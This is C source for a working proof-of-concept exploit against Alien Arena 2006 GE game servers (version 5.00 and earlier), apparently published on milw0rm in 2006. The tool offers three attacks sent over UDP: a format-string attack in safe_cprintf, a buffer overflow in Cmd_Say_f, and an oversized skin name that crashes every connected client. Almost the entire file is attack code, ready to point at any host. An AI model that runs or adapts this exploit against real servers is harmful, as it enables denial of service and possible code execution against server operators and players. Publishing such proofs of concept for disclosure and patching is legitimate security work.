/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <sys/stat.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

    #define close       closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <sys/param.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define stricmp     strcasecmp
    #define strnicmp    strncasecmp
    #define stristr     strcasestr
#endif



#define VER         "0.1"
#define PORT        27910
#define BUFFSZ      8192
#define MINPROTO    0
#define MAXPROTO    256
#define RELIABLE    0x80000000
#define FUCK        "connect %d %hu"        \
                    " %d "                  \
                    "\""                    \
                    "\\spectator\\0"        \
                    "\\gender\\male"        \
                    "\\fov\\90"             \
                    "\\rate\\25000"         \
                    "\\msg\\1"              \
                    "\\skin\\%s"            \
                    "\\name\\%s"            \
                    "\\hand\\0"             \
                    "%s"                    \
                    "\" "                   \
                    "1390\n"                // message length (useless for this game)
#define MAX_OSPATH  128                     // 110 is enough, more is useless!
#define BOFSZ       (2060 - strlen(nick))   // not exact but works
#define FORMATSTR   "%01050x"               // you will see the EIP 0x30303030



int get_quake2_chall(int sd, u_char *buff, int buffsz);
void get_quake2_infoproto(int onlyinfo, int *retproto);
void delimit(u_char *data);
int quake2_build_pck(u_int seq, u_int ack, u_short qport, u_char *buff, int size, u_char *fmt, ...);
int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err);
int create_rand_string(u_char *data, int len, u_int *seed);
int info_proto(u_char *data, int choice);
int timeout(int sock);
u_int resolv(char *host);
void std_err(void);



struct  sockaddr_in peer;



int main(int argc, char *argv[]) {
    u_int   seed;
    int     sd,
            len,
            challenge,
            proto    = 0,
            attack;
    u_short port     = PORT,
            qport;
    u_char  password[128],
            buff[BUFFSZ],
            nick[16],
            *text,
            *skin    = "male/grunt",
            *command = NULL;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Alien Arena 2006 GE <= 5.00 multiple vulnerabilities " VER "\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%hu)]\n"
            "\n"
            "Attack:\n"
            " 1 = safe_cprintf server format string\n"
            " 2 = Cmd_Say_f server buffer-overflow\n"
            " 3 = Com_sprintf crash\n"
            "     this PoC uses a player with a big skin which automatically crash any\n"
            "     client in the server and any other new client\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);

    if(argc > 3) port    = atoi(argv[3]);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    seed      = time(NULL);
    qport     = ~seed;
    text      = buff + 4;
    *password = 0;

    get_quake2_infoproto(0, &proto);
    printf("- use server protocol %d\n", proto);

    create_rand_string(nick, sizeof(nick), &seed);  // here for buffer-overflow and redo

    if(attack == 1) {
        fputs("- attack: safe_cprintf server format string (\""FORMATSTR"\")\n", stdout);
        command = FORMATSTR;

    } else if(attack == 2) {
        printf("- attack: Cmd_Say_f server buffer-overflow (%d bytes)\n", BOFSZ);
        command = malloc(BOFSZ + 10);
        len = sprintf(command, "say ");
        memset(command + len, 'A', BOFSZ);
        command[len + BOFSZ] = 0;

    } else if(attack == 3) {
        printf(
            "- attack: Com_sprintf crash\n"
            "  exploitation versus all the clients in the server\n"
            "  note that some clients could not crash in some cases\n");
        skin = malloc(MAX_OSPATH + 1);
        if(!skin) std_err();
        memset(skin, 'a', MAX_OSPATH);
        skin[MAX_OSPATH] = 0;

    } else {
        printf("\nError: wrong attack number (%d)\n\n", attack);
        exit(1);
    }

redo:
    printf("- start connection:\n");
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    challenge = get_quake2_chall(sd, buff, sizeof(buff));

    len = quake2_build_pck(
        0xffffffff,
        0,
        0,
        buff,
        sizeof(buff),
        FUCK,
        proto,
        ++qport,
        challenge,
        skin,
        nick,
        password);
    len = send_recv(sd, buff, len, buff, sizeof(buff), 1);

    if(strnicmp(text, "client_connect", 14)) {
        if(stristr(text, "full")) {
            printf("- server full\n");
            exit(1);

        } else if(stristr(text, "password")) {
            printf("- server is protected. Insert the password required:\n  ");
            len = sprintf(password, "\\password\\");
            fflush(stdin);
            fgets(password + len, sizeof(password) - len, stdin);
            delimit(password);
            goto redo;

        } else if(stristr(text, "refused") || stristr(text, "reject")) {
            printf("\n"
                "Error: your connection has been refused without reasons:\n"
                "\n"
                "%s\n"
                "\n", text);
            exit(1);

        } else {
            printf(
                "- player has not been accepted with the following error:\n"
                "\n"
                "%s\n"
                "\n", text);
            exit(1);
        }
    }
    printf("    player \"%s\" connected\n", nick);

    if(command) {
        len = quake2_build_pck(
            1 | RELIABLE,
            0,
            qport,
            buff,
            sizeof(buff),
            command,
            NULL);      // the NULL here forces no format
        printf("    command: %s\n", buff + 11);
        len = send_recv(sd, buff, len, buff, sizeof(buff), 1);
    }

    close(sd);
    printf("- finished\n");
    return(0);
}



int get_quake2_chall(int sd, u_char *buff, int buffsz) {
    int     len,
            challenge;
    u_char  *p,
            *text;

    text = buff + 4;

    len = quake2_build_pck(
        0xffffffff,
        0,
        0,
        buff,
        buffsz,
        "getchallenge\n");
    len = send_recv(sd, buff, len, buff, buffsz, 1);

    p = strchr(text, ' ');
    if(!p) {
        printf("\nError: No challenge key in the server's reply:\n%s\n\n", text);
        exit(1);
    }
    sscanf(p + 1, "%d", &challenge);
    printf("    challenge: %d\n", challenge);
    return(challenge);
}



void get_quake2_infoproto(int onlyinfo, int *retproto) {
    int     sd,
            len,
            proto;
    u_char  buff[BUFFSZ],
            *text,
            *p;

    proto = 35;
    text  = buff + 4;

    printf("- request informations and retrieve server protocol:\n");
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    len = quake2_build_pck(
        0xffffffff,
        0,
        0,
        buff,
        sizeof(buff),
        "status");
    len = send_recv(sd, buff, len, buff, sizeof(buff), 1);

    if(*buff == '\\') {
        printf("- the port you have specified seems a query port so I try to query it:\n");
        len = send_recv(sd, "\\status\\", 8, buff, sizeof(buff), 1);
        len = info_proto(buff, 0);
        if(len > 0) {
            printf("- relaunch this tool specifying the port %d\n\n", len);
        }
        close(sd);
        exit(1);
    }

    proto = info_proto(text, 1);

    if(onlyinfo || *retproto) return;

    if(proto < 0) {
        printf(
            "- no server protocol specified in the server's reply.\n"
            "  I try to retrieve it with a fast scanning\n");
        for(proto = MINPROTO; proto < MAXPROTO; proto++) {
            printf("- try protocol %d: ", proto);

            len = quake2_build_pck(
                0xffffffff,
                0,
                0,
                buff,
                sizeof(buff),
                "info %d",
                proto);
            len = send_recv(sd, buff, len, buff, sizeof(buff), 0);
            if(len < 0) {
                printf("- no reply from the server, I try to get protocol from challenge");
                len = quake2_build_pck(
                    0xffffffff,
                    0,
                    0,
                    buff,
                    sizeof(buff),
                    "getchallenge\n");
                len = send_recv(sd, buff, len, buff, sizeof(buff), 1);
                printf("  %s\n", text);
                p = strchr(text, '=');
                if(p) {
                    sscanf(p + 1, "%d", &proto);
                } else {
                    printf("- no protocol in the reply from the server\n");
                    proto = 35;
                }
                break;
            }

            if(!stristr(text, "wrong")) break;
            printf("%s\n", text);
        }
        if(proto == MAXPROTO) {
            printf("\nError: I have not been able to retrieve the server's protocol\n\n");
            exit(1);
        }
        fputc('\n', stdout);
    }

    close(sd);
    *retproto = proto;
}



void delimit(u_char *data) {
    while(*data && (*data != '\n') && (*data != '\r')) data++;
    *data = 0;
}



int quake2_build_pck(u_int seq, u_int ack, u_short qport, u_char *buff, int size, u_char *fmt, ...) {
    va_list ap;
    int     len;
    u_char  *p;

    p = buff;
    *(u_int *)p = seq;
    p += 4;

    if(seq != 0xffffffff) {
        *(u_int *)p = ack;
        p += 4;
        *(u_short *)p = qport;
        p += 2;
        *p++ = 4;
    }

    len = p - buff;

    va_start(ap, fmt);  // check to avoid sprintf, is not important if fails or not
    if(va_arg(ap, u_char *)) {
        va_end(ap);
        va_start(ap, fmt);
        len += vsnprintf(p, (size - 1) - len, fmt, ap);
    } else {
        len += snprintf(p, (size - 1) - len, "%s", fmt);
    }
    va_end(ap);

    return(len + 1);    // NULL byte too
}



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err) {
    int     retry,
            len;

    for(retry = 3; retry; retry--) {
        if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        if(!timeout(sd)) break;
    }

    if(!retry) {
        if(!err) return(-1);
        fputs("\nError: socket timeout, no reply received\n\n", stdout);
        exit(1);
    }

    outsz--;    // NULL bytes handling
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) std_err();
    out[len] = 0;
    return(len);
}



int create_rand_string(u_char *data, int len, u_int *seed) {
    u_int   rnd;
    u_char  *p;
    const static u_char table[] =
                "0123456789"
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz";

    rnd = *seed;
    p   = data;

    len = rnd % len;
    if(len < 8) len = 8;

    while(--len) {
        rnd = (rnd * 0x343FD) + 0x269EC3;
        rnd >>= 3;
        *p++ = table[rnd % (sizeof(table) - 1)];
    }
    *p++ = 0;

    *seed = rnd;
    return(p - data);
}



int info_proto(u_char *data, int choice) {
    int     nt  = 1,
            ret = -1;
    u_char  *p;

    while((p = strchr(data, '\\'))) {
        *p = 0;
        if(nt & 1) {
            if(!ret) {
                ret = atoi(data);
                if(!ret) ret = -1;
            }
            printf("%s\n", data);
        } else {
            if(choice) {    // protocol
                if(!stricmp(data, "protocol") || !stricmp(data, "proto")) ret = 0;
            } else {
                if(!stricmp(data, "hostport")) ret = 0;
            }
            printf("%30s: ", data);
        }
        data = p + 1;
        nt++;
    }
    printf("%s\n\n", data);
    return(ret);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = 1;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2006-03-07]
